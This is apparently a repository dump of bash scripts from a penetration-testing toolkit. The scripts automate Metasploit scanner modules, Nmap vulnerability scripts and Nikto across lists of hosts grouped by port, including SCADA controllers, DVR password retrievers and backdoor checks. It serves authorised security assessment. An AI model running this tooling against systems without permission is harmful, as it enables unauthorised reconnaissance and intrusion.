echo \"    x11\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/x11.txt|g\" /tmp/resource/6000-5-x11.rc\n    cat /tmp/resource/6000-5-x11.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/6379.txt ]; then\n    echo \"    Redis\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/6379.txt|g\" /tmp/resource/6379-redis.rc\n    cat /tmp/resource/6379-redis.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/7777.txt ]; then\n    echo \"    Backdoor\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/7777.txt|g\" /tmp/resource/7777-backdoor.rc\n    cat /tmp/resource/7777-backdoor.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/8000.txt ]; then\n    echo \"    Canon\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/8000.txt|g\" /tmp/resource/8000-canon.rc\n    cat /tmp/resource/8000-canon.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/8080.txt ]; then\n    echo \"    Tomcat\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/8080.txt|g\" /tmp/resource/8080-tomcat.rc\n    cat /tmp/resource/8080-tomcat.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/8080.txt ]; then\n    echo \"    Oracle\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/8080.txt|g\" /tmp/resource/8080-oracle.rc\n    cat /tmp/resource/8080-oracle.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/8222.txt ]; then\n    echo \"    VMware\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/8222.txt|g\" /tmp/resource/8222-vmware.rc\n    cat /tmp/resource/8222-vmware.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/8400.txt ]; then\n    echo \"    Adobe\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/8400.txt|g\" /tmp/resource/8400-adobe.rc\n    cat /tmp/resource/8400-adobe.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/8834.txt ]; then\n    echo \"    Nessus\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/8834.txt|g\" /tmp/resource/8834-nessus.rc\n    cat /tmp/resource/8834-nessus.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/9000.txt ]; then\n    echo \"    Sharp DVR Password Retriever\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/9000.txt|g\" /tmp/resource/9000-sharp.rc\n    cat /tmp/resource/9000-sharp.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/9084.txt ]; then\n    echo \"    VMware\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/9084.txt|g\" /tmp/resource/9084-vmware.rc\n    cat /tmp/resource/9084-vmware.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/9100.txt ]; then\n    echo \"    Printers\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/9100.txt|g\" /tmp/resource/9100-printers.rc\n    cat /tmp/resource/9100-printers.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/9999.txt ]; then\n    echo \"    Telnet\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/9999.txt|g\" /tmp/resource/9999-telnet.rc\n    cat /tmp/resource/9999-telnet.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/13364.txt ]; then\n    echo \"    Rosewill RXS-3211 IP Camera Password Retriever\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/13364.txt|g\" /tmp/resource/13364-rosewill.rc\n    cat /tmp/resource/13364-rosewill.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/17185.txt ]; then\n    echo \"    VxWorks\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/17185.txt|g\" /tmp/resource/17185-udp-vxworks.rc\n    cat /tmp/resource/17185-udp-vxworks.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/20256.txt ]; then\n    echo \"    Unitronics\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/20256.txt|g\" /tmp/resource/20256-unitronics.rc\n    cat /tmp/resource/20256-unitronics.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/28784.txt ]; then\n    echo \"    SCADA Koyo DirectLogic PLC\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/28784.txt|g\" /tmp/resource/28784-scada.rc\n    cat /tmp/resource/28784-scada.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/30718.txt ]; then\n    echo \"    Telnet\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/30718.txt|g\" /tmp/resource/30718-telnet.rc\n    cat /tmp/resource/30718-telnet.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/37777.txt ]; then\n    echo \"    Dahua DVR\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/37777.txt|g\" /tmp/resource/37777-dahua-dvr.rc\n    cat /tmp/resource/37777-dahua-dvr.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/46824.txt ]; then\n    echo \"    SCADA Sielco Sistemi\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/46824.txt|g\" /tmp/resource/46824-scada.rc\n    cat /tmp/resource/46824-scada.rc >> /tmp/master\nfi\n\nif [ -f \"$NAME\"/50000.txt ]; then\n    echo \"    db2\"\n    sed -i \"s|setg RHOSTS.*|setg RHOSTS file:$NAME\\/50000.txt|g\" /tmp/resource/50000-db2.rc\n    cat /tmp/resource/50000-db2.rc >> /tmp/master\nfi\n\necho db_export -f xml -a \"$NAME\"/metasploit.xml >> /tmp/master\necho exit >> /tmp/master\n\nX=$(wc -l /tmp/master | cut -d ' ' -f1)\n\nif [ \"$X\" -eq 3 ]; then\n    echo 2>/dev/null\nelse\n    echo\n    sed 's/\\/\\//\\//g' /tmp/master > \"$NAME\"/master.rc\n    msfdb init\n    msfconsole -r \"$NAME\"/master.rc\n    cat tmpmsf | sed 's/Host is running Windows //g' | sed 's/\\.\\.\\.//g' | grep -Eiv \"(> exit|> run|% complete|1.0 error|appears to be safe|attempting authentication bypass|attempting to extract|authorization not requested|boot.ini not found|checking if file|completed|connecting to the server|connection reset by peer|data_connect failed|database|db_export|did not reply|does not appear|doesn't exist|erb directives|error occurred|failed to login|finished export|handshake failed|ineffective|invalid login|invalid sql|it doesn't seem|login failed|metasploit tip|negotiation failed|nomethoderror|no relay detected|no response|No users found|not allowed to connect|not be identified|not exploitable|not foundnot vulnerable|oracle - checking|oracle - refused|providing some time|request timeout|reset by peer|responded with error|rhosts|rport|scanning for vulnerable|shutting down the tftp|spool|starting export|starting tftp server|starting vnc login|threads|timed out|trying to acquire|unable to login|unknown state)\" > \"$NAME\"/metasploit.txt\n    rm \"$NAME\"/master.rc\n    rm tmpmsf\nfi\n"
        },
        {
          "name": "multiTabs.sh",
          "type": "blob",
          "size": 2.908203125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nf_runlocally\nclear\nf_banner\n\n# Check if Firefox is running\nif pgrep firefox > /dev/null; then\n    echo\n    echo \"[!] Close Firefox before running script.\"\n    echo\n    exit 1\nfi\n\necho -e \"${BLUE}Open multiple tabs in Firefox with:${NC}\"\necho\necho \"1.  List\"\necho \"2.  Files in a directory\"\necho \"3.  Directories in robots.txt\"\necho \"4.  Previous menu\"\necho\necho -n \"Choice: \"\nread -r CHOICE\n\ncase \"$CHOICE\" in\n    1)\n        f_location\n        echo\n        echo -n \"Use an https prefix? (y/N) \"\n        read -r PREFIX\n\n        if [ -z \"$PREFIX\" ]; then\n            while read -r i; do\n                xdg-open http://\"$i\" &\n                sleep 2\n            done < \"$LOCATION\"\n\n        elif [ \"$PREFIX\" == \"y\" ]; then\n            while read -r i; do\n                xdg-open https://\"$i\" &\n                sleep 2\n            done < \"$LOCATION\"\n\n        else\n            f_error\n        fi\n\n        exit\n        ;;\n    2)\n        echo\n        echo \"$MEDIUM\"\n        echo\n        echo -n \"Enter the location of your directory: \"\n        read -r LOCATION\n\n        # Check for no answer\n        if [ -z \"$LOCATION\" ]; then\n            f_error\n        fi\n\n        # Check for wrong answer\n        if [ ! -d \"$LOCATION\" ]; then\n            f_error\n        fi\n\n        cd \"$LOCATION\"\n\n        # option 1\n        for i in $(ls -l | awk '{print $9}'); do\n            xdg-open \"$i\" &\n            sleep 2\n        done\n\n        exit\n        ;;\n    3)\n        echo\n        echo \"$MEDIUM\"\n        echo\n        echo \"Usage: target.com or target-IP\"\n        echo\n        echo -n \"Domain: \"\n        read -r DOMAIN\n\n        # Check for no answer\n        if [ -z \"$DOMAIN\" ]; then\n            f_error\n        fi\n\n        curl -kLs \"$DOMAIN\"/robots.txt -o robots.txt\n\n        if ! curl -kLs \"$DOMAIN\"/robots.txt -o robots.txt; then\n            echo\n            echo -e \"${RED}[!] Failed to connect to $DOMAIN.${NC}\"\n            echo\n            exit 1\n        fi\n\n#        # Check if the file is empty\n#        if [ ! -s robots.txt ]; then\n#            echo\n#            echo -e \"${RED}$MEDIUM${NC}\"\n#            echo\n#            echo -e \"${RED}[*] No robots.txt file discovered.${NC}\"\n#            echo\n#            echo -e \"${RED}$MEDIUM${NC}\"\n#            echo\n#            exit 1\n#        fi\n\n        grep -i 'disallow' robots.txt | awk '{print $2}' | grep -iv disallow | sort -u > tmp\n\n        while read -r i; do\n            xdg-open \"https://$DOMAIN$i\" &\n            sleep 2\n        done < tmp\n\n        rm robots.txt\n        mv tmp \"$HOME\"/data/\"$DOMAIN\"-robots.txt\n\n        echo\n        echo \"$MEDIUM\"\n        echo\n        echo \"[*] Scan complete.\"\n        echo\n        echo -e \"The new report is located at ${YELLOW}$HOME/data/$DOMAIN-robots.txt${NC}\"\n        echo\n        exit\n        ;;\n    4) f_main ;;\n    *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/multiTabs.sh ;;\nesac\n"
        },
        {
          "name": "newModules.sh",
          "type": "blob",
          "size": 4.8916015625,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Check for root\nif [ $EUID -ne 0 ]; then\n    echo\n    echo \"[!] This script must be ran as root.\"\n    echo\n    exit 1\nfi\n\n# Remove nmap scripts not being used\nls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | grep -Eiv '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|clock-skew|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|fcrdns|fingerprint-strings|firewalk|firewall-bypass|ftp-libopie|ftp-libopie|ganglia-info|hnap-info|hostmap-bfk|hostmap-ip2hosts|hostmap-crtsh|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation|ipidseq|ipv6|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|lu-enum|metasploit-info|mmouse-exec|mrinfo|ms-sql-config|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-ready-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|rsa-vuln-roca|rusers|shodan-api|script|sip-call-spoof|skypev2-version|smb-brute|smb-enum-domains|smb-flood|smb-ls|smb-print-text|smb-psexec|smb-vuln-conficker|smb-vuln-cve2009-3103|smb-vuln-ms06-025|smb-vuln-ms07-029|smb-vuln-ms08-067|smb-vuln-ms10-054|smb-vuln-regsvc-dos|smb-vuln-webexec|smb-webexec-exploit|smb2-vuln-uptime|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-auth-methods|ssh-hostkey|ssh-publickey-acceptance|ssh-run|stun-info|teamspeak2-version|targets|tftp-enum|tls-alpn|tn3270-info|tor-consensus-checker|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vtam-enum|vuln-cve|vulners|vuze-dht-info|weblogic-t3-info|whois|xmlrpc-methods|xmpp-info)' > tmp\n\ngrep 'script=' nse.sh | cut -d '=' -f2- | cut -d ' ' -f1 | tr ',' '\\n' | grep -Eiv '(db2-discover|dhcp-discover|dns-service-discovery|membase-http-info|oracle-sid-brute)' | sort -u > tmp2\n\necho > tmp-updates\necho \"New modules to be added.\" > tmp-updates\necho >> tmp-updates\necho >> tmp-updates\necho \"Nmap scripts\" >> tmp-updates\necho \"==============================\" >> tmp-updates\n\ndiff tmp tmp2 | grep -E '^[<>]' | awk '{print $2}' | sed '/^$/d' | grep -Eiv '(iec-identify|ntp-info|rsa-vuln-roca|smb-enum-domains|smb-os-discovery|smb-vuln-cve-2017-7494|ssh2-enum-algos|sshv1|ssl-cert-intaddr|sslv2-drown|tls-ticketbleed)' >> tmp-updates\n\nrm tmp\n\necho >> tmp-updates\necho \"Metasploit auxiliary/scanners\" >> tmp-updates\necho \"==============================\" >> tmp-updates\n\n# Not included: http sap\n\nCATEGORIES=\"afp backdoor chargen couchdb db2 dcerpc dect discovery emc finger ftp h323 imap ip ipmi lotus misc mongodb motorola msf mssql mysql natpmp nessus netbios nexpose nfs ntp openvas oracle pcanywhere pop3 portscan postgres printer rdp rogue rservices scada sip smb smtp snmp ssh telephony telnet tftp upnp vmware vnc voice vxworks winrm x11\"\n\nfor i in $CATEGORIES; do\n    ls -l /usr/share/metasploit-framework/modules/auxiliary/scanner/$i | awk '{print $9}' | cut -d '.' -f1 >> tmp\ndone\n\nsed '/^$/d' tmp > tmp2\n\n# Remove Metasploit scanners not used\ngrep -Eiv '(ack|apache_karaf_command_execution|arp_sweep|call_scanner|cerberus_sftp_enumusers|cisco_smart_install|couchdb_enum|dvr_config_disclosure|empty_udp|endpoint_mapper|ftpbounce|hidden|ibm_mq_channel_brute|indusoft_ntwebserver_fileaccess|ipidseq|ipv6|login|lotus_domino_hashes|lotus_domino_version|management|ms08_067_check|mysql_file_enum|mysql_hashdump|mysql_schemadump|mysql_writable_dirs|natpmp_portscan|poisonivy_control_scanner|profinet_siemens|psexec_loggedin_users|recorder|rogue_recv|rogue_send|sipdroid_ext_enum|snmp_set|ssh_enum_git_keys|ssh_enumusers|ssh_identify_pubkeys|station_scanner|syn|tcp|tftpbrute|udp_probe|udp_sweep|vmware_enum_users|vmware_enum_permissions|vmware_enum_sessions|vmware_enum_vms|vmware_host_details|vmware_screenshot_stealer|wardial|winrm_cmd|winrm_wql|xmas)' tmp2 | sort > tmp-msf-all\n\ngrep 'use ' \"$DISCOVER\"/resource/*.rc | grep -v 'recon-ng' > tmp\n\n# Print from the last /, to the end of the line\nsed -e 's:.*/\\(.*\\):\\1:g' tmp > tmp-msf-used\n\ngrep -v -f tmp-msf-used tmp-msf-all >> tmp-updates\n\necho >> tmp-updates\necho \"theHarvester\" >> tmp-updates\necho \"==============================\" >> tmp-updates\n\ntheHarvester -h > tmp\ncat tmp | sed -n '/anubis/,$p' | sed 's/^[ \\t]*//' | tr ' ,' '\\n' | sed '/^$/d' > tmp2\ngrep 'theHarvester' /opt/discover/passive.sh | grep -v '\"' | awk '{print $5}' > tmp3\ndiff tmp2 tmp3 | grep '<' | awk '{print $2}' >> tmp-updates\n\necho\necho \"$MEDIUM\"\necho\ncat tmp-updates\nrm tmp*\n"
        },
        {
          "name": "nikto.sh",
          "type": "blob",
          "size": 1.802734375,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Check for regular user\nif [ \"$EUID\" == 0 ]; then\n    echo\n    echo \"[!] This option cannot be ran as root.\"\n    echo\n    exit   # In this case do not use exit 1, it will break the script\nfi\n\nclear\nf_banner\n\necho -e \"${BLUE}Run multiple instances of Nikto in parallel.${NC}\"\necho\necho \"1.  List of IPs\"\necho \"2.  List of IP:port\"\necho \"3.  Previous menu\"\necho\necho -n \"Choice: \"\nread -r CHOICE\n\ncase \"$CHOICE\" in\n    1)  f_location\n\n        echo\n        echo -n \"Port (default 80): \"\n        read -r PORT\n        echo\n\n        # Set default port to 80 if not provided\n        if [ -z \"$PORT\" ]; then\n            PORT=80\n        fi\n\n        # Check for a valid port number\n        if ! [[ \"$PORT\" =~ ^[0-9]+$ ]] || [ \"$PORT\" -lt 1 ] || [ \"$PORT\" -gt 65535 ]; then\n            f_error\n        fi\n\n        mkdir -p \"$HOME/data/nikto-$PORT\"\n\n        while IFS= read -r LINE; do\n            xdotool key ctrl+shift+t\n            xdotool type \"nikto -h $LINE -port $PORT -no404 -maxtime 15m -Format htm --output $HOME/data/nikto-$PORT/$LINE.htm ; exit\"\n            sleep 1\n            xdotool key Return\n        done < \"$LOCATION\"\n        ;;\n\n    2)  f_location\n\n        mkdir -p \"$HOME/data/nikto\"\n\n        while IFS=: read -r HOST PORT; do\n            xdotool key ctrl+shift+t\n            sleep 1\n            xdotool type \"nikto -h $HOST -port $PORT -no404 -maxtime 15m -Format htm --output $HOME/data/nikto/$HOST-$PORT.htm ; exit\"\n            sleep 1\n            xdotool key Return\n        done < \"$LOCATION\"\n        ;;\n\n    3)  f_main ;;\n\n    *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/nikto.sh ;;\nesac\n\necho\necho \"$MEDIUM\"\necho\necho \"[*] Scan complete.\"\necho\necho -e \"The new report is located at ${YELLOW}$HOME/data/nikto-$PORT/${NC}\"\n"
        },
        {
          "name": "notes",
          "type": "tree",
          "content": null
        },
        {
          "name": "nse.sh",
          "type": "blob",
          "size": 32.7705078125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\necho\necho \"$MEDIUM\"\necho\necho -e \"${BLUE}Running Nmap scripts.${NC}\"\n\n# If the file for the corresponding port doesn't exist, skip\nif [ -f \"$NAME\"/13.txt ]; then\n    echo \"    Daytime\"\n    nmap --randomize-hosts --randomize-hosts -iL \"$NAME\"/13.txt -Pn -n --open -p13 -sT --script-timeout 20s --script=daytime --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-13.txt\nfi\n\nif [ -f \"$NAME\"/21.txt ]; then\n    echo \"    FTP\"\n    nmap --randomize-hosts -iL \"$NAME\"/21.txt -Pn -n --open -p21 -sT --script-timeout 20s --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-21.txt\nfi\n\nif [ -f \"$NAME\"/22.txt ]; then\n    echo \"    SSH\"\n    nmap --randomize-hosts -iL \"$NAME\"/22.txt -Pn -n --open -p22 -sT -script-timeout 20s --script=rsa-vuln-roca,sshv1,ssh2-enum-algos --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-22.txt\nfi\n\nif [ -f \"$NAME\"/23.txt ]; then\n    echo \"    Telnet\"\n    nmap --randomize-hosts -iL \"$NAME\"/23.txt -Pn -n --open -p23 -sT --script-timeout 20s --script=banner,cics-info,cics-enum,cics-user-enum,telnet-encryption,telnet-ntlm-info,tn3270-screen,tso-enum --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-23.txt\nfi\n\nif [ -f \"$NAME\"/smtp.txt ]; then\n    echo \"    SMTP\"\n    nmap --randomize-hosts -iL \"$NAME\"/smtp.txt -Pn -n --open -p25,465,587 -sT --script-timeout 20s --script=banner,smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,smtp-enum-users,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-smtp.txt\nfi\n\nif [ -f \"$NAME\"/37.txt ]; then\n    echo \"    Time\"\n    nmap --randomize-hosts -iL \"$NAME\"/37.txt -Pn -n --open -p37 -sT --script-timeout 20s --script=rfc868-time --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-37.txt\nfi\n\nif [ -f \"$NAME\"/53.txt ]; then\n    echo \"    DNS\"\n    nmap --randomize-hosts -iL \"$NAME\"/53.txt -Pn -n --open -p53 -sU --script-timeout 20s --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-53.txt\nfi\n\nif [ -f \"$NAME\"/67.txt ]; then\n    echo \"    DHCP\"\n    nmap --randomize-hosts -iL \"$NAME\"/67.txt -Pn -n --open -p67 -sU --script-timeout 20s --script=dhcp-discover --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-67.txt\nfi\n\nif [ -f \"$NAME\"/70.txt ]; then\n    echo \"    Gopher\"\n    nmap --randomize-hosts -iL \"$NAME\"/70.txt -Pn -n --open -p70 -sT --script-timeout 20s --script=gopher-ls --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-70.txt\nfi\n\nif [ -f \"$NAME\"/79.txt ]; then\n    echo \"    Finger\"\n    nmap --randomize-hosts -iL \"$NAME\"/79.txt -Pn -n --open -p79 -sT --script-timeout 20s --script=finger --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-79.txt\nfi\n\nif [ -f \"$NAME\"/102.txt ]; then\n    echo \"    S7\"\n    nmap --randomize-hosts -iL \"$NAME\"/102.txt -Pn -n --open -p102 -sT --script-timeout 20s --script=s7-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-102.txt\nfi\n\nif [ -f \"$NAME\"/110.txt ]; then\n    echo \"    POP3\"\n    nmap --randomize-hosts -iL \"$NAME\"/110.txt -Pn -n --open -p110 -sT --script-timeout 20s --script=banner,pop3-capabilities,pop3-ntlm-info,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-110.txt\nfi\n\nif [ -f \"$NAME\"/111.txt ]; then\n    echo \"    RPC\"\n    nmap --randomize-hosts -iL \"$NAME\"/111.txt -Pn -n --open -p111 -sT --script-timeout 20s --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-111.txt\nfi\n\nif [ -f \"$NAME\"/nntp.txt ]; then\n    echo \"    NNTP\"\n    nmap --randomize-hosts -iL \"$NAME\"/nntp.txt -Pn -n --open -p119,433,563 -sT --script-timeout 20s --script=nntp-ntlm-info --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-nntp.txt\nfi\n\nif [ -f \"$NAME\"/123.txt ]; then\n    echo \"    NTP\"\n    nmap --randomize-hosts -iL \"$NAME\"/123.txt -Pn -n --open -p123 -sU --script-timeout 20s --script=ntp-info,ntp-monlist --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-123.txt\nfi\n\nif [ -f \"$NAME\"/137.txt ]; then\n    echo \"    NetBIOS\"\n    nmap --randomize-hosts -iL \"$NAME\"/137.txt -Pn -n --open -p137 -sU --script-timeout 20s --script=nbstat --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    sed -i '/^MAC/{n; /.*/d}' tmp4        # Find lines that start with MAC, and delete the following line\n    sed -i '/^137\\/udp/{n; /.*/d}' tmp4    # Find lines that start with 137/udp, and delete the following line\n    mv tmp4 \"$NAME\"/script-137.txt\nfi\n\nif [ -f \"$NAME\"/139.txt ]; then\n    echo \"    SMB Vulns\"\n    nmap --randomize-hosts -iL \"$NAME\"/139.txt -Pn -n --open -p139 -sT --script-timeout 20s --script=smb-vuln-cve-2017-7494,smb-vuln-ms10-061,smb-vuln-ms17-010 --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-smbvulns.txt\nfi\n\nif [ -f \"$NAME\"/143.txt ]; then\n    echo \"    IMAP\"\n    nmap --randomize-hosts -iL \"$NAME\"/143.txt -Pn -n --open -p143 -sT --script-timeout 20s --script=imap-capabilities,imap-ntlm-info,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-143.txt\nfi\n\nif [ -f \"$NAME\"/161.txt ]; then\n    echo \"    SNMP\"\n    nmap --randomize-hosts -iL \"$NAME\"/161.txt -Pn -n --open -p161 -sU --script-timeout 20s --script=snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-161.txt\nfi\n\nif [ -f \"$NAME\"/389.txt ]; then\n    echo \"    LDAP\"\n    nmap --randomize-hosts -iL \"$NAME\"/389.txt -Pn -n --open -p389 -sT --script-timeout 20s --script=ldap-rootdse,ssl-cert,ssl-cert-intaddr,ssl-ccs-injection,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-heartbleed,ssl-known-key,ssl-poodle,sslv2,sslv2-drown,tls-nextprotoneg -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-389.txt\nfi\n\nif [ -f \"$NAME\"/443.txt ]; then\n    echo \"    VMware\"\n    nmap --randomize-hosts -iL \"$NAME\"/443.txt -Pn -n --open -p443 -sT --script-timeout 20s --script=vmware-version --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-443.txt\nfi\n\nif [ -f \"$NAME\"/445.txt ]; then\n    echo \"    SMB\"\n    nmap --randomize-hosts -iL \"$NAME\"/445.txt -Pn -n --open -p445 -sT --script-timeout 20s --script=smb-double-pulsar-backdoor,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-services,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-protocols,smb-security-mode,smb-server-stats,smb-system-info,smb2-capabilities,smb2-security-mode,smb2-time,msrpc-enum,stuxnet-detect --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    sed -i '/^445/{n; /.*/d}' tmp4    # Find lines that start with 445, and delete the following line\n    mv tmp4 \"$NAME\"/script-445.txt\nfi\n\nif [ -f \"$NAME\"/500.txt ]; then\n    echo \"    Ike\"\n    nmap --randomize-hosts -iL \"$NAME\"/500.txt -Pn -n --open -p500 -sT -sU --script-timeout 20s --script=ike-version -sV --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-500.txt\nfi\n\nif [ -f \"$NAME\"/db2.txt ]; then\n    echo \"    DB2\"\n    nmap --randomize-hosts -iL \"$NAME\"/db2.txt -Pn -n --open -p523 -sT -sU --script-timeout 20s --script=db2-das-info,db2-discover --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 \"$NAME\"/script-523.txt\nfi\n\nif [ -f \"$NAME\"/524.txt ]; then\n    echo \"    Novell NetWare Core Protocol\"\n    nmap --randomize-hosts -iL \"$NAME\"/524.txt -Pn -n --open -p524 -sT --script-timeout 20s --script=ncp-enum-users,ncp-serverinfo --min-hostgroup 100 --scan-delay \"$DELAY\" > tmp\n    f_cleanup\n    mv tmp4 